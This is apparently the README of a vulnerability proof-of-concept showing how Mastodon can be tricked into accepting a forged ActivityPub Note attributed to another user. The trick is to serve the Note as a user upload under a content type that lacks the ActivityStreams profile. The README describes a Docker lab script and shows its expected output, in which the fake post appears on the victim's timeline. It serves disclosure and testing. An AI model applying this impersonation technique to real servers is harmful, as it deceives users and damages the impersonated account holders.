## Mastodon PoC

The PoC only demonstrates the exploit with a hypothetical remote ActivityPub server where users can upload arbitrary documents to predictable URLs.

In this PoC, the remote server `https://victim.poc.example/` hosts legitimate Activity Streams objects (with the media type of `application/ld+json; profile="https://www.w3.org/ns/activitystreams"`) under `/objects/` directory and user-uploaded documents (with the media type of `application/ld+json` without the `profile` value) under `/user-contents/`.

Then, a supposed threat actor attempts to impersonate a legitimate actor `https://victim.poc.example/objects/@victim.jsonld` by uploading a fake `Note` object `https://victim.poc.example/user-contents/attacker/fake-attribution-note.jsonld` with an `attributedTo` property value of the legitimate actor's URI, and make a Mastodon server `https://observer.poc.example/` fetch the fake `Note`.

The `/mastodon/run.sh` script in this directory runs a Docker Compose project with the Mastodon server and the hypothetical server, and automatically makes some HTTP requests to the Mastodon server to trick it into accepting the fake `Note`.

Usage: `COMPOSE='sudo docker compose' bash run.sh` (`$COMPOSE` defaults to `docker-compose`). You might want to pass `-o xtrace` option to Bash to more closely inspect what's going on.

The script first fetches the legitimate actor object and a legitimate `Note` object of the actor from the hypothetical server, displays their `Content-Type`s (which should be `application/ld+json; profile="https://www.w3.org/ns/activitystreams"`), and make the Mastodon server fetch them, in order to make sure that the setup is working as intended.

It then fetches the fake `Note` document (supposed to have been uploaded by the threat actor beforehand), displays its `Content-Type` (which should be `application/ld+json` without the `profile` value) and trick the Mastodon server into fetching it.

Finally, the script fetches the user timeline of the legitimate actor via the Mastodon server, which would include the fake post if the exploit had worked as intended.

If the exploit works as intended, the script's output should look like so (after a very long output of Docker Compose):

```
Legitimate actor: <https://victim.poc.example/objects/@victim.jsonld>
Checking the content type… Content-Type: application/ld+json; profile="https://www.w3.org/ns/activitystreams"
Looking up via Mastodon…
{"accounts":[{"id":"113515100977338359","username":"victim","acct":"victim@victim.poc.example","display_name":"Attack victim","locked":false,"bot":false,"discoverable":false,"group":false,"created_at":"2015-02-10T00:00:00.000Z","note":"This is a legitimate actor to be the target of the attack in the PoC","url":"https://victim.poc.example/objects/@victim.jsonld","uri":"https://victim.poc.example/objects/@victim.jsonld","avatar":"http://observer.poc.example/avatars/original/missing.png","avatar_static":"http://observer.poc.example/avatars/original/missing.png","header":"http://observer.poc.example/headers/original/missing.png","header_static":"http://observer.poc.example/headers/original/missing.png","followers_count":0,"following_count":0,"statuses_count":1,"last_status_at":null,"emojis":[],"fields":[]}],"statuses":[],"hashtags":[]}

Legitimate note: <https://victim.poc.example/objects/@victim/notes/1.jsonld>
Checking the content type… Content-Type: application/ld+json; profile="https://www.w3.org/ns/activitystreams"
Looking up via Mastodon…
{"accounts":[],"statuses":[{"id":"93295784478436950","created_at":"2015-02-10T15:04:55.000Z","in_reply_to_id":null,"in_reply_to_account_id":null,"sensitive":false,"spoiler_text":"","visibility":"public","language":null,"uri":"https://victim.poc.example/objects/@victim/notes/1.jsonld","url":"https://victim.poc.example/objects/@victim/notes/1.jsonld","replies_count":0,"reblogs_count":0,"favourites_count":0,"edited_at":null,"favourited":false,"reblogged":false,"muted":false,"bookmarked":false,"content":"This is a legitimate note","filtered":[],"reblog":null,"account":{"id":"113515100977338359","username":"victim","acct":"victim@victim.poc.example","display_name":"Attack victim","locked":false,"bot":false,"discoverable":false,"group":false,"created_at":"2015-02-10T00:00:00.000Z","note":"This is a legitimate actor to be the target of the attack in the PoC","url":"https://victim.poc.example/objects/@victim.jsonld","uri":"https://victim.poc.example/objects/@victim.jsonld","avatar":"http://observer.poc.example/avatars/original/missing.png","avatar_static":"http://observer.poc.example/avatars/original/missing.png","header":"http://observer.poc.example/headers/original/missing.png","header_static":"http://observer.poc.example/headers/original/missing.png","followers_count":0,"following_count":0,"statuses_count":2,"last_status_at":"2024-11-20","emojis":[],"fields":[]},"media_attachments":[],"mentions":[],"tags":[],"emojis":[],"card":null,"poll":null}],"hashtags":[]}

Fake note: <https://victim.poc.example/user-contents/attacker/fake-attribution-note.jsonld>
Checking the content type… Content-Type: application/ld+json
Looking up via Mastodon…
{"accounts":[],"statuses":[{"id":"93295784478952880","created_at":"2015-02-10T15:04:55.000Z","in_reply_to_id":null,"in_reply_to_account_id":null,"sensitive":false,"spoiler_text":"","visibility":"public","language":null,"uri":"https://victim.poc.example/user-contents/attacker/fake-attribution-note.jsonld","url":"https://victim.poc.example/user-contents/attacker/fake-attribution-note.jsonld","replies_count":0,"reblogs_count":0,"favourites_count":0,"edited_at":null,"favourited":false,"reblogged":false,"muted":false,"bookmarked":false,"content":"THE NOTE WAS MADE BY AN ATTACKER IMPERSONATING @victim","filtered":[],"reblog":null,"account":{"id":"113515100977338359","username":"victim","acct":"victim@victim.poc.example","display_name":"Attack victim","locked":false,"bot":false,"discoverable":false,"group":false,"created_at":"2015-02-10T00:00:00.000Z","note":"This is a legitimate actor to be the target of the attack in the PoC","url":"https://victim.poc.example/objects/@victim.jsonld","uri":"https://victim.poc.example/objects/@victim.jsonld","avatar":"http://observer.poc.example/avatars/original/missing.png","avatar_static":"http://observer.poc.example/avatars/original/missing.png","header":"http://observer.poc.example/headers/original/missing.png","header_static":"http://observer.poc.example/headers/original/missing.png","followers_count":0,"following_count":0,"statuses_count":3,"last_status_at":"2024-11-20","emojis":[],"fields":[]},"media_attachments":[],"mentions":[],"tags":[],"emojis":[],"card":null,"poll":null}],"hashtags":[]}

Getting the user timeline of the legitimate actor via Mastodon…
[{"id":"93295784478952880","created_at":"2015-02-10T15:04:55.000Z","in_reply_to_id":null,"in_reply_to_account_id":null,"sensitive":false,"spoiler_text":"","visibility":"public","language":null,"uri":"https://victim.poc.example/user-contents/attacker/fake-attribution-note.jsonld","url":"https://victim.poc.example/user-contents/attacker/fake-attribution-note.jsonld","replies_count":0,"reblogs_count":0,"favourites_count":0,"edited_at":null,"content":"THE NOTE WAS MADE BY AN ATTACKER IMPERSONATING @victim","reblog":null,"account":{"id":"113515100977338359","username":"victim","acct":"victim@victim.poc.example","display_name":"Attack victim","locked":false,"bot":false,"discoverable":false,"group":false,"created_at":"2015-02-10T00:00:00.000Z","note":"This is a legitimate actor to be the target of the attack in the PoC","url":"https://victim.poc.example/objects/@victim.jsonld","uri":"https://victim.poc.example/objects/@victim.jsonld","avatar":"http://observer.poc.example/avatars/original/missing.png","avatar_static":"http://observer.poc.example/avatars/original/missing.png","header":"http://observer.poc.example/headers/original/missing.png","header_static":"http://observer.poc.example/headers/original/missing.png","followers_count":0,"following_count":0,"statuses_count":3,"last_status_at":"2024-11-20","emojis":[],"fields":[]},"media_attachments":[],"mentions":[],"tags":[],"emojis":[],"card":null,"poll":null},{"id":"93295784478436950","created_at":"2015-02-10T15:04:55.000Z","in_reply_to_id":null,"in_reply_to_account_id":null,"sensitive":false,"spoiler_text":"","visibility":"public","language":null,"uri":"https://victim.poc.example/objects/@victim/notes/1.jsonld","url":"https://victim.poc.example/objects/@victim/notes/1.jsonld","replies_count":0,"reblogs_count":0,"favourites_count":0,"edited_at":null,"content":"This is a legitimate note","reblog":null,"account":{"id":"113515100977338359","username":"victim","acct":"victim@victim.poc.example","display_name":"Attack victim","locked":false,"bot":false,"discoverable":false,"group":false,"created_at":"2015-02-10T00:00:00.000Z","note":"This is a legitimate actor to be the target of the attack in the PoC","url":"https://victim.poc.example/objects/@victim.jsonld","uri":"https://victim.poc.example/objects/@victim.jsonld","avatar":"http://observer.poc.example/avatars/original/missing.png","avatar_static":"http://observer.poc.example/avatars/original/missing.png","header":"http://observer.poc.example/headers/original/missing.png","header_static":"http://observer.poc.example/headers/original/missing.png","followers_count":0,"following_count":0,"statuses_count":3,"last_status_at":"2024-11-20","emojis":[],"fields":[]},"media_attachments":[],"mentions":[],"tags":[],"emojis":[],"card":null,"poll":null}]
The timeline should contain the fake note if the attack was successful.

The containers are kept running so that you can manually play with them.
Run `docker compose stop` to stop them.
```
